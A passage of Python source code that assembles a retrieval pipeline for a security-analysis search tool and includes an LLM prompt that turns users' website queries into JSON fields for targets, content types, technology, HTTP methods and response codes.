            custom_query_expander = QueryExpander(generator_config, prompt=query_expander_xml, number=5,
                                                  include_original_query=False, doc_type="xml")
        elif doc_type_model.doc_type == "network":
            custom_query_expander = QueryExpander(generator_config, prompt=query_expander_network, number=5,
                                                  include_original_query=False, doc_type="network")
        if custom_query_expander is not None:
            custom_query_expander_name = "query_expander_" + doc_type_model.doc_type
            pipe.add_component(custom_query_expander_name, custom_query_expander)
            pipe.connect("query.text", custom_query_expander_name + ".query")
            pipe.connect("query.targets", custom_query_expander_name + ".targets")
            pipe.connect("vuln_type_parser", custom_query_expander_name)

        for col in doc_type_model.get_chroma_collections():
            store = create_chrome_document_store(db=db, collection_name=col)
            stores[col] = store
            retriever = ChromaEmbeddingRetriever(document_store=store)
            multiquery_retriever = MultiQueryChromaRetriever(doc_type_model.doc_type, embedder, retriever)
            retrievers[col] = multiquery_retriever

            ret_name = f"ret_{col}"
            pipe.add_component(ret_name, multiquery_retriever)

            # wiring: Query → embedder → retriever → combiner
            pipe.connect("query.max_results", ret_name + ".top_k")
            pipe.connect("query.progress_callback", ret_name + ".progress_callback")
            if custom_query_expander_name is not None:
                pipe.connect(custom_query_expander_name + ".queries", ret_name + ".queries")
            else:
                pipe.connect("query_expander.queries", ret_name + ".queries")
            pipe.connect("query.filters", ret_name + ".filters")
            pipe.connect(ret_name + ".documents", f"combine.{col}_documents")

    # pipe.add_component("trace_docs", TraceDocs())
    # pipe.connect("query.text", "trace_docs.query")
    # pipe.connect("query_expander.queries", "trace_docs.expanded_queries")
    # pipe.connect("combine.documents", "trace_docs.documents")

    return pipe, retrievers, stores


def build_website_context_pipeline(generator_config: GeneratorConfig) -> Pipeline:
    prompt = """
      You are a cybersecurity search assistant that processes users queries for websites.

      You determine the target hostname, IP address(es), site url(s) and ports the user is interested in. If the user specifies
      a scheme do not change it. Never add a scheme the user did not provide. Never suggest targets. Only accept explicit targets given by the user.
      Follow these rules when determining the targets:
       - Multiple sites may be specified, preserve the hostname and IP addresses.
         Example: http://example.com and http://sub1.example.com are two targets, http://example.com and http://sub1.example.com
       - The hostname may include several components in dot-notation.
         Example: web01.internal.example.com is one target, web01.internal.example.com
       - If the user specifies a protocol, keep it.
         Example: http://example.com is exactly one target, http://example.com
         Example: https://example.com is exactly one target, https://example.com
       - A hostname or IP address is permitted without a protocol and without a port, such as target.local
         Example: target.local is one target, target.local
       - A hostname or IP address is permitted without a protocol but with a port, such as target.local:443
         Example: example.com:443 is one target, example.com:443
         Example: example.com:80 is one target, example.com:80

      You also determine optional types of content the user is interested in from the following list:
      "html", "forms", "xml", "javascript", "css", "json", "network". If the query includes things that would be in the HTTP headers such as cookies, the content security policy or response messages include the content type "network".

      You also determine technology stacks the user references, if any.

      You also determine if anything in the query implies a specific set of HTTP response codes. Do not include response codes in the 200-299 range.

      You also determine if anything in the query implies the request was made using a specific set of HTTP methods such as "GET", "POST", "PUT", if any. Only include methods if the user is asking for how the request was made. Usually the user will intend HTTP methods that are in the RFC, but may ask for specific non-standard methods. Be cautious about providing methods so to not be too limiting.
      
      Structure:
      Output the information as a valid JSON object. Only output the JSON. Do not include any other text except the JSON.
      
      The list of web sites uses key "target". The value of "target" is a valid JSON list. It is a list of url(s), hostnames, and/or IP addresses.

      The list of content types uses key "content". The value of "content" is a valid JSON list. Only use the aforementioned list of content types.

      The list of technology uses key "tech". The value of "tech" is a valid JSON list. Prefer using the format of "name/version".

      The list of HTTP methods uses key "methods". The value of "methods" is a valid JSON list of upper case alphanumeric strings.

      The list of HTTP response codes uses key "response_codes". The value of "response_codes" is a valid JSON list of integers.

      Examples:
        1. Example Query 1: "Examine http://target.local for vulns"  
           Example Result: {"target": ["http://target.local"], "content": [], "tech": [], "methods": [], "response_codes": []}

        2. Example Query 2: "Examine http://target.local and http://sub1.target.local for vulns"
           Example Result: {"target": ["http://target.local", "http://sub1.target.local"], "content": [], "tech": [], "methods": [], "response_codes": []}

        3. Example Query 3: "Examine 10.10.10.10:8000 for risky javascript functions"  
           Example Result: {"target": ["10.10.10.10:8000"], "content": ["html", "javascript"], "tech": [], "methods": [], "response_codes": []}

        4. Example Query 4: "Examine nobody.net for vulnerable versions of WordPress"  
           Example Result: {"target": ["nobody.net"], "content": ["network", "html", "javascript"], "tech": ["WordPress"], "methods": [], "response_codes": []}

        5. Example Query 5: "Examine authentication failures on schooldaze.edu for username disclosure"
           Example Result: {"target": ["schooldaze.edu"], "content": ["html", "javascript"], "tech": [""], "methods": [], "response_codes": [403]}

        6. Example Query 6: "Examine posted forms on 192.168.1.1:8090 for XSS vulns."
           Example Result: {"target": ["192.168.1.1:8090"], "content": ["html", "javascript"], "tech": [""], "methods": ["POST"], "response_codes": []}

        7. Example Query 7: "Find forbidden pages on https://schooldaze.edu"   
           Example Result: {"target": ["https://schooldaze.edu"], "content": ["network"], "tech": [""], "methods": [], "response_codes": [403]}

        8. Example Query 7: "Find bad requests on https://schooldaze.edu"   
           Example Result: {"target": ["https://schooldaze.edu"], "content": ["network"], "tech": [""], "methods": [], "response_codes": [400]}

      Your Task:
      Query: "{{query}}"
      JSON targets, optional content, optional tech:
      """
    builder = PromptBuilder(prompt, required_variables=["query"])
    llm = generator_config.create_generator(temperature=0.1)
    pipeline = Pipeline()
    pipeline.add_component("builder", builder)
    pipeline.add_component("llm", llm)
    pipeline.connect("builder", "llm")
    return pipeline
